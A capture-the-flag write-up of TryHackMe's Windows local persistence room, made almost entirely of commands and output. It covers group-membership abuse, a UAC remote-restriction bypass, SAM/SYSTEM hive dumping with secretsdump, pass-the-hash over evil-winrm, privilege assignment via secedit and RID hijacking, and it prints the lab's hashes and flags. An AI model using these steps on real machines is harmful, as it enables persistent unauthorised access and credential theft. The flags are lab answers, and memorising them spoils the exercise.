# About This Module
Module link: https://tryhackme.com/room/windowslocalpersistence

# Assigning Group Memberships
1. Start this room's machine and our TryHackMe AttackBox
2. `cd \` to change to the compromised Windows machine's filesystem root directory to ensure that we'll be executing the following commands from starting from there
```PowerShell
C:\Users\Administrator>cd \
```
3. `net localgroup “Backup Operators” thmuser1 /add` from the compromised Windows machine to add our target user (thmuser1) to the compromised system's **Backup Operators** group, which won't give our target user administrative privileges but it will allow them to read and write to files within its system regardless of the system's DACL configurations and any other set permissions that may prevent users from accessing those files
```PowerShell
C:\>net localgroup "Backup Operators" thmuser1 /add
The command completed successfully.
```
4. `net localgroup “Remote Management Users” thmuser1 /add` from the compromised Windows machine to add our target user (thmuser1) to the compromised system's **Remote Management Users** group in order to have our target user be able to connect back to the compromised machine using WinRM
```PowerShell
C:\>net localgroup "Remote Management Users" thmuser1 /add
The command completed successfully.
```
5. `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v /EnableLUA` from the compromised Windows machine to check if Microsoft's UAC is active on our compromised machine and display the results onto our terminal, which ended up being the case (1 meaning that it's enabled) and therefore preventing us from running any administrative privileges when remotely connecting back to the compromised machine since it strips the user who's remotely connecting to the compromised system from any administrative privileges that they may have by disabling their access to the privileges of the groups that they're a part of that have full or certain administrator privileges, which in this case was the **Backup Operators** group
```PowerShell
C:\>reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```
6. `reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1` from the compromised Windows machine to enable the compromised system's LocalAccountTokenFilterPolicy registry policy, which allowed us to disable UAC's remote restrictions and have the **Backup Operators** group's privileges enabled for our compromised user when connecting remotely to the compromised system
```PowerShell
C:\>reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
The operation completed successfully.
```
7. `evil-winrm -i {TARGET IP} -u thmuser1 -p Password321` from our Linux attack machine to remotely connect to the compromised machine as our target user (thmuser1) using WinRM
```Bash
root@ip-10-10-72-227:~# evil-winrm -i 10.10.41.253 -u thmuser1 -p Password321

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\thmuser1\Documents> 
```
8. `whoami /groups` to display what groups the currently logged in user is a part of onto our terminal, which showed the **Backup Operators** group to be enabled since we enabled the LocalAccountTokenFilterPolicy registry policy on the compromised Windows machine
```bash
*Evil-WinRM* PS C:\Users\thmuser1\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```
9. `cd \` to change to the compromised Windows machine's filesystem root directory to ensure that we'll be executing the following commands from starting from there
```Bash
*Evil-WinRM* PS C:\Users\thmuser1\Documents> cd \
```
10. `reg save hklm\system {FILENAME1}.bak` to create and save a backup file of the compromised Windows machine's **System** registry key, which successfully created the backup file on the compromised machine
```Bash
*Evil-WinRM* PS C:\> reg save hklm\system SYSTEM.bak
The operation completed successfully.

```
11. `reg save hklm\sam {FILENAME2}.bak` to create and save a backup file of the compromised Windows machine's **SAM** registry key, which successfully created the backup file on the compromised machine
```Bash
*Evil-WinRM* PS C:\> reg save hklm\sam SAM.bak
The operation completed successfully.

```
12. `download {FILENAME1}.bak` to download the backup file of the compromised Windows machine's **System** registry key from their system onto our Linux attack machine
```Bash
*Evil-WinRM* PS C:\> download SYSTEM.bak
Info: Downloading C:\\SYSTEM.bak to SYSTEM.bak

                                                             
Info: Download successful!
```
13. `download {FILENAME2}.bak` to download the backup file of the compromised Windows machine's **SAM** registry key from their system onto our Linux attack machine
```Bash
*Evil-WinRM* PS C:\> download SAM.bak
Info: Downloading C:\\SAM.bak to SAM.bak

                                                             
Info: Download successful!
```
14. `exit` to exit our current PowerShell session on our attack machine and terminate the connection
```Bash
*Evil-WinRM* PS C:\> exit

Info: Exiting with code 0

root@ip-10-10-72-227:~# 
```
15. `ls` to display the files and directories that are in our current working directory onto our terminal, which showed that the two backup files were indeed successfully downloaded onto our machine
```Bash
root@ip-10-10-72-227:~# ls
Desktop    Instructions  Postman  SAM.bak  SYSTEM.bak         Tools
Downloads  Pictures      Rooms    Scripts  thinclient_drives  work
```
16. `python3.9 /opt/impacket/examples/secretsdump.py -sam {FILENAME2}.bak -system {FILENAME1}.bak LOCAL` to dump the password hashes of all the users that are in the compromised machine from its SAM registry key that we backed up into a file into Impacket's **secretsdump.py** program (https://github.com/fortra/impacket/blob/master/examples/secretsdump.py), which was already installed on our AttackBox, using both backup files that we created on and retrieved from the compromised machine and output the results onto our terminal, which ended up outputting the compromised machine's administrator's password hash which we can then use to authenticate as the administrator when remotely connecting back to the compromised machine using WinRM
```Bash
root@ip-10-10-72-227:~# python3.9 /opt/impacket/examples/secretsdump.py -sam SAM.bak -system SYSTEM.bak LOCAL 
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
thmuser1:1008:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser2:1009:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser3:1010:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser0:1011:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
thmuser4:1013:aad3b435b51404eeaad3b435b51404ee:8767940d669d0eb618c15c11952472e5:::
[*] Cleaning up... 
```
17. `evil-winrm -i {TARGET IP} -u Administrator -H {PASSWORD HASH}` to perform a Pass-the-Hash (PtH) attack on the compromised machine to log in as the Administrator using their password hash, which ended up working
```Bash
root@ip-10-10-72-227:~# evil-winrm -i 10.10.41.253 -u Administrator -H f3118544a831e728781d780cfdb9c1fa

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
18. `C:\flags\flag1.exe` to run the flag1.exe program, which ended up displaying this task's flag onto our terminal
```Bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> C:\flags\flag1.exe
THM{FLAG_BACKED_UP!}
```

**TASK COMPLETED**

# Assigning Specific Privileges Using Security Descriptors
1. Start this room's machine
2. `PowerShell`
```PowerShell
C:\Users\Administrator>PowerShell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator>
```
3. `cd \`
```PowerShell
PS C:\Users\Administrator> cd \
```
4. `whoami`
```PowerShell
PS C:\> whoami
wpersistence\administrator
```
5. `whoami /priv`
```PowerShell
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```
6. `secedit /export /cfg {FILENAME1}.inf`
```PowerShell
PS C:\> secedit /export /cfg CONFIG.inf

The task has completed successfully.
See log %windir%\security\logs\scesrv.log for detail info.
```
7. `dir`
```PowerShell
PS C:\> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/4/2023   2:56 AM          19318 CONFIG.inf
```
8. `notepad {FILENAME1}.inf`
```PowerShell
PS C:\Users\Administrator> notepad CONFIG.inf
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/notepad%20CONFIG.inf.png)

9. add thmuser 2 to both privileges

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/CONFIG.inf%20Modifications.png)

10. `secedit /import /cfg {FILENAME1}.inf /db {FILENAME2}.sdb`
```PowerShell
PS C:\> secedit /import /cfg CONFIG.inf /db CONFIG.sdb
```
11. `secedit /configure /db {FILENAME2}.sdb /cfg config.inf`
```PowerShell
PS C:\> secedit /configure /db CONFIG.sdb /cfg CONFIG.inf

The task has completed successfully.
See log %windir%\security\logs\scesrv.log for detail info.
```
12. `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI`
```PowerShell
PS C:\> Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
WARNING: Set-PSSessionConfiguration may need to restart the WinRM service if a configuration using this name
has recently been unregistered, certain system data structures may still be cached. In that case, a restart of
 WinRM may be required.
All WinRM sessions connected to Windows PowerShell session configurations, such as Microsoft.PowerShell and
session configurations that are created with the Register-PSSessionConfiguration cmdlet, are disconnected.
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Configuration%20Window%20Open.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Configuration%20Window%20Add%20User.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Configuration%20Window%20Modify%20Permissions%20Zoomed%20In.png)

13. `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` from the compromised Windows machine to check if Microsoft's UAC is active on our compromised machine and display the results onto our terminal, which ended up being the case (1 meaning that it's enabled) and therefore preventing us from running any administrative privileges when remotely connecting back to the compromised machine since it strips the user who's remotely connecting to the compromised system from any administrative privileges that they may have by disabling their access to the privileges of the groups that they're a part of that have full or certain administrator privileges, which in this case was the **Backup Operators** group
```PowerShell
C:\>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```
14. `reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1` from the compromised Windows machine to enable the compromised system's LocalAccountTokenFilterPolicy registry policy, which allowed us to disable UAC's remote restrictions and have the **Backup Operators** group's privileges enabled for our compromised user when connecting remotely to the compromised system
```PowerShell
C:\>reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
The operation completed successfully.
```
15. `evil-winrm -i {TARGET IP} -u thmuser2 -p Password321`
```Bash
root@ip-10-10-254-192:~# evil-winrm -i 10.10.56.140 -u thmuser2 -p Password321

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\thmuser2\Documents> 
```
16. `whoami /priv`
```Bash
*Evil-WinRM* PS C:\Users\thmuser2\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
17. `C:\flags\flag2.exe` to run the flag2.exe program, which ended up displaying this task's flag onto our terminal
```Bash
*Evil-WinRM* PS C:\Users\thmuser2\Documents> C:\flags\flag2.exe
THM{IM_JUST_A_NORMAL_USER}
```

**TASK COMPLETED**

# RID Hijacking
1. Start this room's machine
2. `cd \`
```PowerShell
PS C:\Users\Administrator> cd \
```
3. `wmic useraccount get name,sid`
```PowerShell
PS C:\> wmic useraccount get name,sid
Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser0            S-1-5-21-1966530601-3185510712-10604624-1011
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
thmuser4            S-1-5-21-1966530601-3185510712-10604624-1013
WDAGUtilityAccount  S-1-5-21-1966530601-3185510712-10604624-504
```
4. `cd C:\tools\pstools`
```PowerShell
C:\>cd C:\tools\pstools
```
5. `PsExec64 -i -s regedit`
```PowerShell
C:\tools\pstools>PsExec64 -i -s regedit

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Registry%20Editor%20Window%20Open.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Registry%20Editor%20thmuser3%20Window.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Registry%20Editor%20thmuser3%20Current%20RID.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Registry%20Editor%20thmuser3%20New%20RID.png)

6. `evil-winrm -i {TARGET IP} -u thmuser3 -p Password321`
```Bash
root@ip-10-10-28-182:~# evil-winrm -i 10.10.159.254 -u thmuser3 -p Password321

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMWSManFault happened, message is [WSMAN ERROR CODE: 5]: <f:WSManFault Code='5' Machine='10.10.159.254' xmlns:f='http://schemas.microsoft.com/wbem/wsman/1/wsmanfault'><f:Message>Access is denied. </f:Message></f:WSManFault>

Error: Exiting with code 1
```
7. `sudo remmina`

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Remmina%20Window%20Open.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Remmina%20Window%20RDP%20Authentication.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Remmina%20Window%20Open%20Command%20Prompt.png)

8. `whoami`
```PowerShell
C:\Users\Administrator>whoami
wpersistence\administrator
```
9. `C:\flags\flag3.exe` to run the flag3.exe program, which ended up displaying this task's flag onto our terminal
```PowerShell
C:\Users\Administrator>C:\flags\flag3.exe
THM{TRUST_ME_IM_AN_ADMIN}
```

**ROOM COMPLETED**
